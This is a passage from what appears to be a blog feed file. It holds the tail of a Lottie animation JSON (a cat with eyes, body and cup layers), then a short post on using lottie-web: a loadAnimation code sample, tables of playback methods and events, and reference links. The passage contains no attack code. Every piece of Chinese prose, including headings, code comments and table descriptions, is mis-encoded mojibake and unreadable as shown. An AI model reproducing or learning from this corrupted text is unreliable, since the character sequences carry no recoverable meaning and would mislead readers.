[                            0,                            0                          ],                          [                            -20.5,                            43.5                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            127.5,                            15                          ],                          [                            84.5,                            60.5                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.71,                      "y": 0                    },                    "t": 4,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            14.52,                            -15.566                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -27.75,                            29.75                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            124.75,                            33.5                          ],                          [                            107,                            68.75                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.71,                      "y": 0                    },                    "t": 13,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            29.5,                            -4.25                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -40.267,                            5.801                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            130,                            75                          ],                          [                            100.5,                            91.75                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.71,                      "y": 0                    },                    "t": 19,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            29.805,                            0                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -37.25,                            0                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            145.75,                            92.5                          ],                          [                            97.25,                            92.75                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.167,                      "y": 0                    },                    "t": 38,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            29.5,                            -4.25                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -40.267,                            5.801                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            130,                            75                          ],                          [                            100.5,                            91.75                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "i": {                      "x": 0.29,                      "y": 1                    },                    "o": {                      "x": 0.167,                      "y": 0                    },                    "t": 50,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            29.805,                            0                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -37.25,                            0                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            145.75,                            92.5                          ],                          [                            97.25,                            92.75                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  },                  {                    "t": 62,                    "s": [                      {                        "i": [                          [                            0,                            0                          ],                          [                            20.5,                            -43.5                          ],                          [                            8.5,                            0                          ]                        ],                        "o": [                          [                            0,                            0                          ],                          [                            -20.5,                            43.5                          ],                          [                            -8.5,                            0                          ]                        ],                        "v": [                          [                            127.5,                            15                          ],                          [                            84.5,                            60.5                          ],                          [                            20.5,                            92.5                          ]                        ],                        "c": false                      }                    ]                  }                ],                "ix": 2,                "x": "var $bm_rt;$bm_rt = content('Shape 1').content('Path 1').path;"              },              "nm": "Path 1",              "mn": "ADBE Vector Shape - Group",              "hd": false            },            {              "ty": "st",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 3              },              "o": {                "a": 0,                "k": 100,                "ix": 4              },              "w": {                "a": 0,                "k": 20,                "ix": 5              },              "lc": 2,              "lj": 1,              "ml": 4,              "bm": 0,              "nm": "Stroke 1",              "mn": "ADBE Vector Graphic - Stroke",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  0,                  -0.124                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Shape 1",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    },    {      "ddd": 0,      "ind": 3,      "ty": 4,      "nm": "eye 2",      "sr": 1,      "ks": {        "o": {          "a": 0,          "k": 100,          "ix": 11        },        "r": {          "a": 0,          "k": 0,          "ix": 10        },        "p": {          "a": 0,          "k": [            144,            135.75,            0          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            -1.375,            -47.25,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            100,            100,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  11.875,                  16.5                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -0.812,                  -25.125                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 1",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        },        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  43.25,                  17.125                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -1.375,                  -42.688                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  -8                ],                "ix": 1              },              "s": {                "a": 1,                "k": [                  {                    "i": {                      "x": [                        0.22,                        0.22                      ],                      "y": [                        1,                        1                      ]                    },                    "o": {                      "x": [                        0.78,                        0.78                      ],                      "y": [                        0,                        0                      ]                    },                    "t": 0,                    "s": [                      100,                      100                    ]                  },                  {                    "i": {                      "x": [                        0.22,                        0.22                      ],                      "y": [                        1,                        1                      ]                    },                    "o": {                      "x": [                        0.78,                        0.78                      ],                      "y": [                        0,                        0                      ]                    },                    "t": 14,                    "s": [                      100,                      200                    ]                  },                  {                    "t": 26,                    "s": [                      100,                      100                    ]                  }                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 3",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 2,          "mn": "ADBE Vector Group",          "hd": false        },        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  33,                  33                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0.929411764706,                  0.929411764706,                  0.929411764706,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -0.75,                  -24.75                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 2",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 3,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    },    {      "ddd": 0,      "ind": 4,      "ty": 4,      "nm": "eye",      "sr": 1,      "ks": {        "o": {          "a": 0,          "k": 100,          "ix": 11        },        "r": {          "a": 0,          "k": 0,          "ix": 10        },        "p": {          "a": 0,          "k": [            190,            135.75,            0          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            -1.375,            -47.25,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            100,            100,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  11.875,                  16.5                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -0.812,                  -25.125                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 1",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        },        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  43.25,                  17.125                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -1.375,                  -42.688                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  -8                ],                "ix": 1              },              "s": {                "a": 1,                "k": [                  {                    "i": {                      "x": [                        0.22,                        0.22                      ],                      "y": [                        1,                        1                      ]                    },                    "o": {                      "x": [                        0.78,                        0.78                      ],                      "y": [                        0,                        0                      ]                    },                    "t": 0,                    "s": [                      100,                      100                    ]                  },                  {                    "i": {                      "x": [                        0.22,                        0.22                      ],                      "y": [                        1,                        1                      ]                    },                    "o": {                      "x": [                        0.78,                        0.78                      ],                      "y": [                        0,                        0                      ]                    },                    "t": 14,                    "s": [                      100,                      200                    ]                  },                  {                    "t": 26,                    "s": [                      100,                      100                    ]                  }                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 3",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 2,          "mn": "ADBE Vector Group",          "hd": false        },        {          "ty": "gr",          "it": [            {              "d": 1,              "ty": "el",              "s": {                "a": 0,                "k": [                  33,                  33                ],                "ix": 2              },              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 3              },              "nm": "Ellipse Path 1",              "mn": "ADBE Vector Shape - Ellipse",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0.929411764706,                  0.929411764706,                  0.929411764706,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  -0.75,                  -24.75                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Ellipse 2",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 3,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    },    {      "ddd": 0,      "ind": 5,      "ty": 4,      "nm": "body",      "sr": 1,      "ks": {        "o": {          "a": 0,          "k": 100,          "ix": 11        },        "r": {          "a": 0,          "k": 0,          "ix": 10        },        "p": {          "a": 0,          "k": [            190,            183,            0          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            0,            0,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            100,            100,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "ty": "st",              "c": {                "a": 0,                "k": [                  1,                  1,                  1,                  1                ],                "ix": 3              },              "o": {                "a": 0,                "k": 100,                "ix": 4              },              "w": {                "a": 0,                "k": 2,                "ix": 5              },              "lc": 1,              "lj": 1,              "ml": 4,              "bm": 0,              "nm": "Stroke 1",              "mn": "ADBE Vector Graphic - Stroke",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Shape 2",          "np": 2,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        },        {          "ty": "gr",          "it": [            {              "ind": 0,              "ty": "sh",              "ix": 1,              "ks": {                "a": 0,                "k": {                  "i": [                    [                      8.5,                      -21.5                    ],                    [                      -1.75,                      -11.25                    ],                    [                      -2.75,                      -32.75                    ],                    [                      0,                      0                    ],                    [                      -2.548,                      -8.493                    ],                    [                      -5,                      0                    ],                    [                      0,                      0                    ],                    [                      -1,                      8.5                    ],                    [                      10,                      37                    ],                    [                      1.5,                      17.5                    ],                    [                      9,                      27.5                    ],                    [                      2.339,                      -7.796                    ],                    [                      27.56,                      -6.89                    ]                  ],                  "o": [                    [                      -8.5,                      21.5                    ],                    [                      1.75,                      11.25                    ],                    [                      2.75,                      32.75                    ],                    [                      0,                      0                    ],                    [                      0.75,                      2.5                    ],                    [                      5,                      0                    ],                    [                      0,                      0                    ],                    [                      1,                      -8.5                    ],                    [                      -10,                      -37                    ],                    [                      -1.5,                      -17.5                    ],                    [                      -9,                      -27.5                    ],                    [                      -0.375,                      1.25                    ],                    [                      -0.875,                      0.25                    ]                  ],                  "v": [                    [                      -71.125,                      -70.75                    ],                    [                      -76,                      0.25                    ],                    [                      -64,                      48.75                    ],                    [                      -60,                      110.25                    ],                    [                      -67,                      119.5                    ],                    [                      -62.25,                      122                    ],                    [                      62.5,                      122                    ],                    [                      65.5,                      108.5                    ],                    [                      60,                      54.5                    ],                    [                      34.5,                      -2.5                    ],                    [                      24,                      -67                    ],                    [                      7,                      -59.5                    ],                    [                      -56.125,                      -58.25                    ]                  ],                  "c": true                },                "ix": 2              },              "nm": "Path 1",              "mn": "ADBE Vector Shape - Group",              "hd": false            },            {              "ty": "st",              "c": {                "a": 0,                "k": [                  1,                  1,                  1,                  1                ],                "ix": 3              },              "o": {                "a": 0,                "k": 100,                "ix": 4              },              "w": {                "a": 0,                "k": 2,                "ix": 5              },              "lc": 1,              "lj": 1,              "ml": 4,              "bm": 0,              "nm": "Stroke 1",              "mn": "ADBE Vector Graphic - Stroke",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Shape 1",          "np": 3,          "cix": 2,          "bm": 0,          "ix": 2,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    },    {      "ddd": 0,      "ind": 6,      "ty": 4,      "nm": "cup",      "sr": 1,      "ks": {        "o": {          "a": 1,          "k": [            {              "i": {                "x": [                  0.4                ],                "y": [                  1                ]              },              "o": {                "x": [                  0.6                ],                "y": [                  0                ]              },              "t": 33,              "s": [                100              ]            },            {              "t": 64,              "s": [                0              ]            }          ],          "ix": 11        },        "r": {          "a": 1,          "k": [            {              "i": {                "x": [                  0.4                ],                "y": [                  1                ]              },              "o": {                "x": [                  0.6                ],                "y": [                  0                ]              },              "t": 30,              "s": [                0              ]            },            {              "t": 45,              "s": [                -56              ]            }          ],          "ix": 10        },        "p": {          "a": 1,          "k": [            {              "i": {                "x": 0.4,                "y": 1              },              "o": {                "x": 0.6,                "y": 0              },              "t": 30,              "s": [                81.25,                303.25,                0              ],              "to": [                -5.333,                27.167,                0              ],              "ti": [                5.333,                -27.167,                0              ]            },            {              "t": 65,              "s": [                49.25,                466.25,                0              ]            }          ],          "ix": 2,          "l": 2        },        "a": {          "a": 0,          "k": [            296.706,            356.03,            0          ],          "ix": 1,          "l": 2        },        "s": {          "a": 0,          "k": [            18.103,            18.103,            100          ],          "ix": 6,          "l": 2        }      },      "ao": 0,      "shapes": [        {          "ty": "gr",          "it": [            {              "ind": 0,              "ty": "sh",              "ix": 1,              "ks": {                "a": 0,                "k": {                  "i": [                    [                      0.966,                      -0.966                    ],                    [                      0,                      -9.683                    ],                    [                      21.363,                      2.705                    ],                    [                      5.028,                      -0.094                    ],                    [                      0,                      0                    ],                    [                      -6.032,                      -4.295                    ],                    [                      17.171,                      -28.476                    ],                    [                      -30.215,                      88.283                    ],                    [                      -23.622,                      -0.17                    ],                    [                      0,                      0                    ],                    [                      -9.052,                      -81.353                    ],                    [                      -61.255,                      -5.087                    ],                    [                      0,                      -18.269                    ],                    [                      -123.286,                      0.247                    ],                    [                      -13.291,                      17.952                    ],                    [                      0,                      162.767                    ],                    [                      0,                      0                    ],                    [                      0,                      0                    ]                  ],                  "o": [                    [                      -0.966,                      0.969                    ],                    [                      0,                      23.823                    ],                    [                      -5.294,                      -0.671                    ],                    [                      0,                      0                    ],                    [                      6.648,                      0.512                    ],                    [                      21.074,                      15.007                    ],                    [                      -44.498,                      73.804                    ],                    [                      12.145,                      -35.489                    ],                    [                      0,                      0                    ],                    [                      -61.683,                      2.756                    ],                    [                      6.676,                      60.003                    ],                    [                      32.063,                      2.663                    ],                    [                      0,                      45.81                    ],                    [                      96.187,                      -0.193                    ],                    [                      5.384,                      -7.272                    ],                    [                      0,                      0                    ],                    [                      0,                      0                    ],                    [                      -78.15,                      -0.372                    ]                  ],                  "v": [                    [                      -70.054,                      -178.66                    ],                    [                      -71.812,                      -159.297                    ],                    [                      -96.291,                      -135.1                    ],                    [                      -115.433,                      -135.972                    ],                    [                      -115.433,                      -109.37                    ],                    [                      -92.601,                      -102.239                    ],                    [                      -79.393,                      44.838                    ],                    [                      -175.104,                      -52.196                    ],                    [                      -114.384,                      -109.462                    ],                    [                      -114.384,                      -135.873                    ],                    [                      -206.834,                      7.737                    ],                    [                      -108.262,                      102.185                    ],                    [                      -71.812,                      125.982                    ],                    [                      73.99,                      179.868                    ],                    [                      210.445,                      157.253                    ],                    [                      215.886,                      -14.584                    ],                    [                      215.886,                      -179.072                    ],                    [                      73.795,                      -179.743                    ]                  ],                  "c": true                },                "ix": 2              },              "nm": "Path 1",              "mn": "ADBE Vector Shape - Group",              "hd": false            },            {              "ty": "fl",              "c": {                "a": 0,                "k": [                  0,                  0,                  0,                  1                ],                "ix": 4              },              "o": {                "a": 0,                "k": 100,                "ix": 5              },              "r": 1,              "bm": 0,              "nm": "Fill 1",              "mn": "ADBE Vector Graphic - Fill",              "hd": false            },            {              "ty": "tr",              "p": {                "a": 0,                "k": [                  208.114,                  179.868                ],                "ix": 2              },              "a": {                "a": 0,                "k": [                  0,                  0                ],                "ix": 1              },              "s": {                "a": 0,                "k": [                  100,                  100                ],                "ix": 3              },              "r": {                "a": 0,                "k": 0,                "ix": 6              },              "o": {                "a": 0,                "k": 100,                "ix": 7              },              "sk": {                "a": 0,                "k": 0,                "ix": 4              },              "sa": {                "a": 0,                "k": 0,                "ix": 5              },              "nm": "Transform"            }          ],          "nm": "Group 1",          "np": 2,          "cix": 2,          "bm": 0,          "ix": 1,          "mn": "ADBE Vector Group",          "hd": false        }      ],      "ip": 0,      "op": 65,      "st": 0,      "bm": 0    }  ],  "markers": []}, });lottie.play();</script><p>ï¼ˆæœ‰è¿™ä¸œè¥¿è¿˜æ‰‹å†™å•¥åŠ¨ç”»~ï¼‰<br><br></p><h3 id="1-ä½¿ç”¨æ–¹æ³•"><a href="#1-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="1. ä½¿ç”¨æ–¹æ³•"></a>1. ä½¿ç”¨æ–¹æ³•</h3><p>lottie-web ç”Ÿæˆçš„svg/canvas/htmlåŠ¨ç”»ï¼Œå†…å­˜å ç”¨ä¸ Gif åŠ¨ç”»å·®ä¸å¤šã€‚ğŸ‘†ä¸Šé¢è¿™åªçŒ«å°±æ˜¯ä¸€ä¸ªsvgï¼ˆ12kbï¼‰<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lottie <span class="keyword">from</span> <span class="string">'lottie-web'</span>;</span><br><span class="line"><span class="keyword">import</span> animationJsonData <span class="keyword">from</span> <span class="string">'xxx-demo.json'</span>;  <span class="comment">// json æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> lot = lottie.loadAnimation(&#123;</span><br><span class="line">   container: <span class="built_in">document</span>.getElementById(<span class="string">'lottie'</span>), </span><br><span class="line">   renderer: <span class="string">'svg'</span>,</span><br><span class="line">   loop: <span class="literal">true</span>,</span><br><span class="line">   autoplay: <span class="literal">false</span>,</span><br><span class="line">   animationData: animationJsonData,</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼€å§‹æ’­æ”¾åŠ¨ç”»</span></span><br><span class="line">lot.play();</span><br></pre></td></tr></table></figure></p><p>æ§åˆ¶åŠ¨ç”»æ’­æ”¾çš„æ–¹æ³•ï¼š</p><table><thead><tr><th>åç§°</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td>animation.play</td><td style="text-align:center">æ’­æ”¾è¯¥åŠ¨ç”»ï¼Œä»ç›®å‰åœæ­¢çš„å¸§å¼€å§‹æ’­æ”¾</td></tr><tr><td>stop</td><td style="text-align:center">åœæ­¢æ’­æ”¾è¯¥åŠ¨ç”»ï¼Œå›åˆ°ç¬¬ 0 å¸§pauseæš‚åœè¯¥åŠ¨ç”»ï¼Œåœ¨å½“å‰å¸§åœæ­¢å¹¶ä¿æŒ</td></tr><tr><td>goToAndStop</td><td style="text-align:center">è·³åˆ°æŸä¸ªæ—¶åˆ»/å¸§å¹¶åœæ­¢</td></tr><tr><td>goToAndPlay</td><td style="text-align:center">è·³åˆ°æŸä¸ªæ—¶åˆ»/å¸§å¹¶è¿›è¡Œæ’­æ”¾</td></tr><tr><td>goToAndStop(30, true)</td><td style="text-align:center">è·³è½¬åˆ°ç¬¬ 30 å¸§å¹¶åœæ­¢</td></tr><tr><td>playSegments</td><td style="text-align:center">æ’­æ”¾ç‰‡æ®µï¼Œå¦‚ç›´æ¥æ’­æ”¾ 0-5 å¸§å’Œ 10-18 å¸§</td></tr><tr><td>setSpeed</td><td style="text-align:center">è®¾ç½®æ’­æ”¾é€Ÿåº¦ </td></tr><tr><td>setDirection</td><td style="text-align:center">è®¾ç½®æ’­æ”¾æ–¹å‘,æ­£å‘é€†å‘</td></tr><tr><td>destroy</td><td style="text-align:center">åˆ é™¤è¯¥åŠ¨ç”»ï¼Œç§»é™¤ç›¸åº”çš„å…ƒç´ æ ‡ç­¾ç­‰ã€‚åœ¨ unmount çš„æ—¶å€™ï¼Œéœ€è¦è°ƒç”¨è¯¥æ–¹æ³•</td></tr></tbody></table><p>ç›‘å¬äº‹ä»¶ï¼š</p><table><thead><tr><th>åç§°</th><th style="text-align:center">æè¿°</th></tr></thead><tbody><tr><td>data_ready</td><td style="text-align:center">åŠ è½½å®Œ json åŠ¨ç”»</td></tr><tr><td>complete</td><td style="text-align:center">æ’­æ”¾å®Œæˆï¼ˆå¾ªç¯æ’­æ”¾ä¸‹ä¸ä¼šè§¦å‘ï¼‰</td></tr><tr><td>loopComplete</td><td style="text-align:center">å½“å‰å¾ªç¯ä¸‹æ’­æ”¾ï¼ˆå¾ªç¯æ’­æ”¾/éå¾ªç¯æ’­æ”¾ï¼‰ç»“æŸæ—¶è§¦å‘</td></tr><tr><td>enterFrame</td><td style="text-align:center">æ¯è¿›å…¥ä¸€å¸§å°±ä¼šè§¦å‘ï¼Œæ’­æ”¾æ—¶æ¯ä¸€å¸§éƒ½ä¼šè§¦å‘ä¸€æ¬¡ï¼Œstop æ–¹æ³•ä¹Ÿä¼šè§¦å‘</td></tr><tr><td>segmentStart</td><td style="text-align:center">æ¯è¿›å…¥ä¸€å¸§å°±ä¼šè§¦å‘ï¼Œæ’­æ”¾æ—¶æ¯ä¸€å¸§éƒ½ä¼šè§¦å‘ä¸€æ¬¡ï¼Œstop æ–¹æ³•ä¹Ÿä¼šè§¦å‘</td></tr><tr><td>DOM Loaded</td><td style="text-align:center">åŠ¨ç”»ç›¸å…³çš„ dom å·²ç»è¢«æ·»åŠ åˆ° html åè§¦å‘</td></tr><tr><td>destroy</td><td style="text-align:center">å°†åœ¨åŠ¨ç”»åˆ é™¤æ—¶è§¦å‘</td></tr></tbody></table><p><br></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.cn/post/6966866737396449316?searchId=2025031820301931F0449995A29C1E9718" target="_blank" rel="noopener">é£ä¹¦ä¸­ Lottie åŠ¨ç”»çš„åº”ç”¨</a></li><li><a href="https://www.zhihu.com/search?type=content&amp;q=lottie" target="_blank" rel="noopener">å‰–æ lottie-web åŠ¨ç”»å®ç°åŸç†</a></li></ul>]]></content>
      
      <categories>
          
          <category> åŠ¨ç”»/åª’ä½“ </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æµå¼æ¸²æŸ“ SSE</title>
